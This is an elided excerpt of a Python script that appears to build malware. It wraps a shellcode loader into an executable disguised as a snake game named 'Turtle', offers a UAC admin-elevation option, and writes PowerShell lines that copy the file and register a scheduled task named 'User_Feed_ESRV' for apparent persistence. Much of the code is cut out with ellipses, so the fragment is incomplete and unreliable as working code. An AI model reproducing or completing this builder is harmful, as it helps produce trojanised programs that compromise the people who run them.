...
def create_exe(py_file, game_type, uac, include_pyd=False):
    ...
    try:
        ...
        if game_type == "snake":
            ...
            name = "Turtle"
        uac_option = "--uac-admin" if uac else "--noupx"
...
def main():
    ...
    parser.add_argument("-url", "--url", required=False, help="URL")
    ...
    # Execute the command when -sh argument is provided
        ...
        shellcode_path = os.path.abspath(args.shellcode)
        os.chdir('shellcd')
       
        print (shellcode_path)
        subprocess.run(["python", "loader.py", shellcode_path])
        ...
        r"Copy-Item -Path '{{exe_file_path}}' -Destination $directoryPath",
        r"$outputFile = '{{exe_file_path}}'",
        "$taskName = 'User_Feed_ESRV'",
        r"$taskPath = Join-Path $directoryPath \'{{exe_file_name}}\'",
...
# Get the path to the directory containing the bundled files
    ...
    if os.path.basename(current_dir) == 'shellcd':
...
# Find the positions of the start and end markers in 'paw.py'
    ...
    # Display message and create exe file
        ...
        if args.shellcode:
            create_exe('./shellcd/sh.py', "no gui", args.uac, include_pyd=True)
        else:
